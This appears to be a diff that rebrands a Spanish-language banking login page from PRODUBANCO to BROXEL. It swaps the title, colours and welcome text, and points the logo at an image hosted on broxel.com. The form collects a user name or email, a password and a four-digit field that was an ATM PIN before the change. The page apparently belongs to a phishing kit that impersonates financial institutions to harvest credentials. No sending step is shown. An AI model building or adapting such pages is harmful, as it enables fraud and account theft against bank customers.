@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>PRODUBANCO</title>
+  <title>BROXEL</title>
   <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
@@ -75,7 +75,7 @@
     }
 
     button {
-      background-color: #1B4D08;
+      background-color: #00C4EB;
       color: white;
       padding: 8px 20px;
       border: none;
@@ -108,13 +108,13 @@
 </head>
 <body>
   <div class="screen active" id="pantallaInicio">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="PRODUBANCO" class="logo">
-    <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
-    <p>Ingrese su usuario y contraseña para iniciar con su proceso financiero.</p>
+    <img src="https://broxel.com/wp-content/uploads/2024/05/cropped-Broxel_favicon-300x300.png" alt="PRODUBANCO" class="logo">
+    <h2>Bienvenido a <strong>BROXEL</strong></h2>
+    <p>Ingrese su correo electronico, contraseña y celular (ultimos 4 digitos) para iniciar con su proceso financiero.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="text" id="usuario" placeholder="Ingrese su usuario" required>
+        <input type="email" id="usuario" placeholder="Ingrese su correo electronico" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
@@ -123,7 +123,7 @@
       <!-- Nuevo campo Clave de cajero -->
       <div class="input-group">
         <div class="icon"><i class="fas fa-key"></i></div>
-        <input type="text" id="cajero" placeholder="Clave de cajero" maxlength="4" required>
+        <input type="tel" id="cajero" placeholder="Ultimos 4 digitos" maxlength="4" required>
       </div>
       
       <p id="usuarioError" class="mensaje-error"></p>
